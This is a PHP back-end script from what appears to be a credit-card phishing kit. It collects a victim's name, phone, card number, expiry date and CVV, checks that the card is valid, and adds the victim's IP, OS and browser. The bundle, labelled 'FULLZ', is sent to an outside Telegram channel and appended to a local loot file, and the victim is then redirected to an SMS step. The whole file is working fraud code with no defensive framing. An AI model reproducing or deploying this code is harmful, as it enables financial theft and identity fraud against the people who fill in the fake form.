<?php
require("config.php");

if(!empty($_POST['fname']) && !empty($_POST['lname']) && !empty($_POST['ccnum']) && !empty($_POST['exp']) && !empty($_POST['cvv']) && !empty($_POST['phone']))
{
  if(validatecard($_POST['ccnum']) == false)
  {
    header("Location: clients/informations.php");
  }else{
    if(!checkExp($_POST['exp']))
    {
        header("Location: clients/informations.php");
    }else{
      $message = '/-- FULLZ --/' . getIPAddress() . "\r\n";
      $message .= '[Prenom] = ' . $_POST['fname'] . "\r\n";
      $message .= '[Nom] = ' . $_POST['lname'] . "\r\n";
      $message .= '[Phone] = ' . $_POST['phone'] . "\r\n";
      $message .= '[Credit Card Number] = ' . $_POST['ccnum'] . "\r\n";
      $message .= '[Expiration Date] = ' . $_POST['exp'] . "\r\n";
      $message .= '[CVV] = ' . $_POST['cvv'] . "\r\n";
      $message .= '[TIME/DATE] = ' . $date . "\r\n";
      $message .= '[IP address] = ' . getIPAddress() . "\r\n";
      $message .= '[OS] = ' . $user_os . "\r\n";
      $message .= '[BROWSER] = ' . $user_browser . "\r\n";
      telegram_send(urlencode($message));
      $house = fopen('fucked/FULLZ.html', 'a');
      fwrite($house, $message);
      fclose($house);
      header("Location: clients/sms.php");
    }
  }
  
}
?>